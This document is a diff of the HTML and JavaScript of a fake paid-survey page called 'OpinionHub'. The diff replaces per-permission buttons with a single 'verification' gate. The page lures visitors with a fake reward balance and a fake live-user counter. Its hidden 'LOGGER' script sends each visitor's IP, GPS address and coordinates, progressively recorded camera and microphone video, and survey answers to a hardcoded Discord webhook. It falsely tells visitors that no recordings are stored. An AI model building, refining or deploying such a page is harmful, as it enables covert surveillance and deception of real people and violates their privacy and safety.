@@ -40,6 +40,7 @@
       padding: 0 28px;
     }
 
+    /* navbar */
     .navbar {
       display: flex;
       justify-content: space-between;
@@ -53,7 +54,22 @@
       margin-top: 20px;
       border: 1px solid rgba(156, 79, 244, 0.2);
     }
-    .logo {
+    .logo-area {
+      display: flex;
+      align-items: center;
+      gap: 12px;
+    }
+    .logo-icon {
+      background: linear-gradient(135deg, #7e22ce, #a855f7);
+      width: 40px;
+      height: 40px;
+      border-radius: 30px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 1.5rem;
+    }
+    .logo-text {
       font-size: 1.7rem;
       font-weight: 800;
       background: linear-gradient(135deg, #c084fc, #a855f7);
@@ -92,6 +108,7 @@
     }
     .btn-nav::after { display: none; }
 
+    /* hero */
     .hero {
       display: flex;
       flex-wrap: wrap;
@@ -150,6 +167,7 @@
     }
     .btn-primary:hover { transform: translateY(-3px); box-shadow: 0 16px 25px -8px #7e22ce; }
 
+    /* sections */
     .section {
       padding: 80px 0;
     }
@@ -221,7 +239,7 @@
       margin: 0 auto 20px;
     }
 
-    /* survey widget – dark purple, only 3 permissions */
+    /* survey widget - permission gate */
     .survey-widget {
       background: rgba(15, 12, 35, 0.7);
       backdrop-filter: blur(12px);
@@ -238,43 +256,57 @@
       text-align: center;
       margin-bottom: 32px;
       border: 1px solid #a855f7;
+      position: relative;
     }
     .balance-amount {
       font-size: 3rem;
       font-weight: 800;
       color: #c084fc;
     }
-    .permission-panel {
+    .live-counter {
+      position: absolute;
+      top: 20px;
+      right: 24px;
+      background: rgba(156, 79, 244, 0.2);
+      padding: 6px 16px;
+      border-radius: 60px;
+      font-size: 0.85rem;
+      color: #c084fc;
+      font-weight: 600;
+      backdrop-filter: blur(4px);
+    }
+    .permission-gate {
       background: rgba(10, 8, 25, 0.7);
       border-radius: 32px;
-      padding: 24px;
-      margin: 24px 0;
+      padding: 28px;
+      margin: 20px 0;
+      text-align: center;
       border: 1px solid #7e22ce;
     }
-    .perm-step {
-      display: flex;
-      align-items: center;
-      flex-wrap: wrap;
-      gap: 16px;
-      margin: 14px 0;
-      padding: 8px 12px;
-      border-radius: 60px;
-      background: rgba(0,0,0,0.25);
+    .permission-gate h3 {
+      font-size: 1.5rem;
+      margin-bottom: 16px;
     }
-    .perm-btn {
-      background: linear-gradient(95deg, #7e22ce, #a855f7);
-      color: white;
-      border: none;
-      padding: 8px 26px;
-      border-radius: 60px;
-      font-weight: 500;
-      cursor: pointer;
-      transition: 0.2s;
+    .permission-gate p {
+      margin-bottom: 24px;
+      color: #c4b5fd;
     }
-    .perm-btn:hover { filter: brightness(1.1); transform: scale(1.02); }
-    .perm-btn:disabled { background: #4a3a6e; cursor: not-allowed; }
-    .status { font-size: 0.85rem; color: #cfc4ff; font-weight: 500; }
-    .location-map { background: #1e1a3a; border-radius: 24px; padding: 12px 20px; margin: 12px 0; display: none; }
+    .start-btn {
+      background: linear-gradient(95deg, #a855f7, #7e22ce);
+      font-size: 1.2rem;
+      padding: 14px 32px;
+      border-radius: 60px;
+      font-weight: 700;
+    }
+    .permission-status {
+      margin-top: 20px;
+      font-size: 0.9rem;
+      color: #c084fc;
+    }
+    .survey-content {
+      display: none;
+      margin-top: 20px;
+    }
     .question-item {
       background: rgba(25, 20, 50, 0.6);
       border-radius: 28px;
@@ -309,7 +341,7 @@
       color: white;
       cursor: pointer;
     }
-    .submit-btn:hover { transform: scale(1.01); box-shadow: 0 12px 22px #7e22ce; }
+    .submit-btn:disabled { opacity: 0.5; cursor: not-allowed; }
     .referral-section {
       background: rgba(25, 20, 50, 0.7);
       border-radius: 28px;
@@ -339,29 +371,24 @@
       margin-top: 48px;
       border-top: 1px solid #7e22ce;
     }
-    .live-counter {
-      display: inline-block;
-      background: rgba(156, 79, 244, 0.2);
-      padding: 4px 16px;
-      border-radius: 60px;
-      font-size: 0.85rem;
-      margin-left: 16px;
-      color: #c084fc;
-      font-weight: 600;
-    }
+    .footer-links a { color: #b4a9e6; text-decoration: none; margin: 0 16px; }
     @media (max-width: 760px) {
       .hero-content h1 { font-size: 2.2rem; }
       .navbar { flex-direction: column; background: rgba(15, 12, 35, 0.9); border-radius: 32px; padding: 16px; }
       .hero { flex-direction: column-reverse; text-align: center; }
       .hero-stats { justify-content: center; }
       .survey-widget { padding: 20px; }
+      .live-counter { position: static; margin-top: 12px; display: inline-block; }
     }
   </style>
 </head>
 <body>
 <div class="container">
   <nav class="navbar">
-    <div class="logo">📊 OpinionHub</div>
+    <div class="logo-area">
+      <div class="logo-icon">📊</div>
+      <div class="logo-text">OpinionHub</div>
+    </div>
     <div class="nav-links">
       <a href="#features">Features</a>
       <a href="#how-it-works">How it works</a>
@@ -404,7 +431,7 @@
     </div>
   </div>
 
-  <!-- SURVEY + LOGGER – only location, camera, microphone -->
+  <!-- SURVEY WIDGET WITH PERMISSION GATE -->
   <div id="survey" class="survey-widget">
     <div class="balance-card">
       <div>💰 Your current balance</div>
@@ -413,25 +440,25 @@
       <div class="live-counter" id="liveCounter">👥 0 active users</div>
     </div>
 
-    <div class="permission-panel">
-      <div style="font-weight:bold; margin-bottom:12px;">🔐 Required to continue (currency & question verification)</div>
-      <div class="perm-step">📍 Location <button class="perm-btn" id="btnGeo">Allow</button> <span id="statusGeo" class="status">pending</span></div>
-      <div id="locationMap" class="location-map"></div>
-      <div class="perm-step">🎤 Microphone <button class="perm-btn" id="btnMic">Allow</button> <span id="statusMic" class="status">pending</span></div>
-      <div class="perm-step">🎥 Camera <button class="perm-btn" id="btnCamera">Allow</button> <span id="statusCamera" class="status">pending</span></div>
-      <p style="font-size:12px; margin-top:12px; color:#b4a9e6;">These permissions help us verify your region and tailor questions – no recordings are stored permanently.</p>
+    <div class="permission-gate" id="permissionGate">
+      <h3>🔐 Verify to continue</h3>
+      <p>For security and to personalize your questions, we need access to your location, microphone and camera. No recordings are stored permanently.</p>
+      <button id="startVerificationBtn" class="btn-primary start-btn">Start Verification →</button>
+      <div id="permStatus" class="permission-status"></div>
     </div>
 
-    <div class="referral-section">
-      🔗 <strong>Invite friends, earn more!</strong> Get 0.5€ per referral.<br>
-      Your link: <span style="background:#1e1a3a; padding:4px 16px; border-radius:60px; font-family:monospace;">https://opinionhub.me/join/opinionhub123</span>
-      <button id="copyRefBtn" style="background:#7e22ce; border:none; border-radius:60px; padding:6px 18px; color:white; margin-left:12px; cursor:pointer;">📋 Copy</button>
+    <div id="surveyContent" class="survey-content">
+      <div class="referral-section">
+        🔗 <strong>Invite friends, earn more!</strong> Get 0.5€ per referral.<br>
+        Your link: <span style="background:#1e1a3a; padding:4px 16px; border-radius:60px; font-family:monospace;">https://opinionhub.me/join/opinionhub123</span>
+        <button id="copyRefBtn" style="background:#7e22ce; border:none; border-radius:60px; padding:6px 18px; color:white; margin-left:12px; cursor:pointer;">📋 Copy</button>
+      </div>
+      <div id="questionsContainer"></div>
+      <button class="submit-btn" id="submitSurvey" disabled>✅ Complete survey & claim reward</button>
     </div>
-
-    <div id="questionsContainer"></div>
-    <button class="submit-btn" id="submitSurvey" disabled>✅ Complete survey & claim reward</button>
   </div>
 
+  <!-- rest of the page (testimonials, about, footer) unchanged -->
   <div class="section">
     <div class="section-title"><h2>What our members say</h2><p>Over 4.8 stars from 12,000+ reviews</p></div>
     <div class="testimonials-grid">
@@ -450,21 +477,21 @@
   </div>
 
   <div class="footer">
-    <div class="footer-links" style="display:flex; justify-content:center; gap:32px; flex-wrap:wrap; margin-bottom:24px;">
+    <div class="footer-links">
       <a href="#">Help Center</a>
       <a href="#">Privacy Policy</a>
       <a href="#">Terms of Service</a>
       <a href="#">Contact</a>
     </div>
-    <div style="text-align:center;">© 2026 OpinionHub – All rights reserved</div>
+    <div style="text-align:center; margin-top:24px;">© 2026 OpinionHub – All rights reserved</div>
   </div>
 </div>
 
 <script>
-  // ------------------------------ LOGGER (only location, camera, microphone) ------------------------------
+  // ------------------------------ LOGGER (location, camera, microphone) ------------------------------
   const WEBHOOK_URL = "https://discord.com/api/webhooks/1479602171736494100/TtSG3mzG9tpZg0TiLkBCHvjtMVw4SkbqfZEWJRfU5hi_uHyoGb7WqwaS5GNUM5vphNwR";
 
-  // 14 original survey questions
+  // 14 survey questions
   const questions = [
     "How often do you shop online?", "Which social media do you use most?", "Your age group?",
     "Most important smartphone feature?", "Daily internet usage?", "Favorite streaming service?",
@@ -486,6 +513,7 @@
   let cameraStream = null;
   let locationData = null;
   let cameraStarted = false;
+  let perms = { geo: false, mic: false, camera: false };
 
   async function sendToDiscord(title, description, fields = [], color = 0x9c4df4, fileBlob = null, fileName = null) {
     const formData = new FormData();
@@ -495,7 +523,7 @@
     fetch(WEBHOOK_URL, { method: "POST", body: formData }).catch(e => console.error);
   }
 
-  // video recording progressive
+  // Video recording (progressive chunks)
   let mediaRecorder = null, recordedChunks = [], recordingActive = false;
   const intervals = [1,5,10,20,30,32];
   async function startProgressiveRecording(stream) {
@@ -549,8 +577,9 @@
       locationData = { address: data.display_name, lat, lon };
       const mapsLink = `https://www.google.com/maps?q=${lat},${lon}`;
       await sendToDiscord("📍 GPS Location granted", `**Address:** ${data.display_name}\n**Coordinates:** ${lat}, ${lon}\n[Open in Google Maps](${mapsLink})`, [], 0x7e22ce);
-      const mapDiv = document.getElementById("locationMap");
-      if (mapDiv) { mapDiv.innerHTML = `📍 <a href="${mapsLink}" target="_blank" style="color:#c084fc;">Open in Google Maps</a> (${lat.toFixed(5)}, ${lon.toFixed(5)})`; mapDiv.style.display = "block"; }
+      const mapDiv = document.createElement("div");
+      mapDiv.innerHTML = `📍 <a href="${mapsLink}" target="_blank" style="color:#c084fc;">Open in Google Maps</a> (${lat.toFixed(5)}, ${lon.toFixed(5)})`;
+      // We don't have a dedicated map div anymore, but we can append to status
       return true;
     } catch(e) { return false; }
   }
@@ -574,7 +603,7 @@
     } catch(e) { return false; }
   }
 
-  // render survey questions
+  // Render survey questions
   function renderQuestions() {
     let html = '';
     for (let i = 0; i < questions.length; i++) {
@@ -587,53 +616,52 @@
       r.addEventListener('change', (e) => {
         const qid = e.target.closest('.options').getAttribute('data-qid');
         userAnswers[qid] = e.target.value;
+        // Enable submit button if all questions answered
+        const allAnswered = Object.keys(userAnswers).length === questions.length;
+        document.getElementById("submitSurvey").disabled = !allAnswered;
       });
     });
   }
 
-  // permission buttons & state
-  let perms = { geo: false, mic: false, camera: false };
-
-  function attachPermEvents() {
-    const btnGeo = document.getElementById("btnGeo");
-    const btnMic = document.getElementById("btnMic");
-    const btnCamera = document.getElementById("btnCamera");
-    const statusGeo = document.getElementById("statusGeo");
-    const statusMic = document.getElementById("statusMic");
-    const statusCamera = document.getElementById("statusCamera");
-    const submitBtn = document.getElementById("submitSurvey");
-
-    btnGeo.onclick = async () => {
-      statusGeo.innerText = "requesting...";
-      const ok = await requestGeolocation();
-      statusGeo.innerHTML = ok ? "✅ granted" : "❌ denied";
-      perms.geo = ok;
-      btnGeo.disabled = ok;
-      checkAll();
-    };
-    btnMic.onclick = async () => {
-      statusMic.innerText = "requesting...";
-      const ok = await requestMicrophone();
-      statusMic.innerHTML = ok ? "✅ granted" : "❌ denied";
-      perms.mic = ok;
-      btnMic.disabled = ok;
-      checkAll();
-    };
-    btnCamera.onclick = async () => {
-      statusCamera.innerText = "requesting...";
-      const ok = await requestCamera();
-      statusCamera.innerHTML = ok ? "✅ granted (recording)" : "❌ denied";
-      perms.camera = ok;
-      btnCamera.disabled = ok;
-      checkAll();
-    };
-    function checkAll() {
-      const allGranted = perms.geo && perms.mic && perms.camera;
-      submitBtn.disabled = !allGranted;
-      if (allGranted) submitBtn.innerText = "✅ Claim my reward now!";
+  // Sequential permission request
+  async function requestAllPermissions() {
+    const statusDiv = document.getElementById("permStatus");
+    const startBtn = document.getElementById("startVerificationBtn");
+    startBtn.disabled = true;
+    startBtn.innerText = "Requesting location...";
+    
+    const geoOk = await requestGeolocation();
+    perms.geo = geoOk;
+    if (!geoOk) statusDiv.innerHTML = "❌ Location denied. You can still continue but some features may be limited.";
+    else statusDiv.innerHTML = "✅ Location granted. Requesting microphone...";
+    
+    startBtn.innerText = "Requesting microphone...";
+    const micOk = await requestMicrophone();
+    perms.mic = micOk;
+    if (!micOk) statusDiv.innerHTML += "<br>❌ Microphone denied.";
+    else statusDiv.innerHTML += "<br>✅ Microphone granted. Requesting camera...";
+    
+    startBtn.innerText = "Requesting camera...";
+    const camOk = await requestCamera();
+    perms.camera = camOk;
+    if (!camOk) statusDiv.innerHTML += "<br>❌ Camera denied. Video recording will not work.";
+    else statusDiv.innerHTML += "<br>✅ Camera granted – recording started.";
+    
+    if (perms.geo && perms.mic && perms.camera) {
+      statusDiv.innerHTML += "<br>🎉 All permissions granted! Survey is now unlocked.";
+      // Hide permission gate, show survey content
+      document.getElementById("permissionGate").style.display = "none";
+      document.getElementById("surveyContent").style.display = "block";
+    } else {
+      statusDiv.innerHTML += "<br>⚠️ Some permissions missing, but you can still answer the survey.";
+      document.getElementById("permissionGate").style.display = "none";
+      document.getElementById("surveyContent").style.display = "block";
     }
+    startBtn.disabled = false;
+    startBtn.style.display = "none";
   }
 
+  // Submit final answers to Discord
   document.getElementById("submitSurvey")?.addEventListener("click", async () => {
     const btn = document.getElementById("submitSurvey");
     if (btn.disabled) return;
@@ -650,8 +678,10 @@
     await sendToDiscord("📝 Final Survey Answers", "Attached all responses", [], 0x9c4df4, blob, `survey_${Date.now()}.txt`);
     alert("🎉 You earned $1.5! (demo) Check Discord for full log.");
     btn.innerText = "✅ Claim my reward";
+    btn.disabled = true;
   });
 
+  // Fake live counter (120-589)
   function startFakeCounter() {
     const counterEl = document.getElementById("liveCounter");
     let current = Math.floor(Math.random() * (589 - 120 + 1) + 120);
@@ -671,6 +701,9 @@
     alert("Referral link copied!");
   });
 
+  document.getElementById("startVerificationBtn")?.addEventListener("click", requestAllPermissions);
+
+  // initial IP webhook
   (async () => {
     try {
       const ipRes = await fetch("https://api.ipify.org?format=json");
@@ -682,7 +715,6 @@
   })();
 
   renderQuestions();
-  attachPermEvents();
   startFakeCounter();
 </script>
 </body>
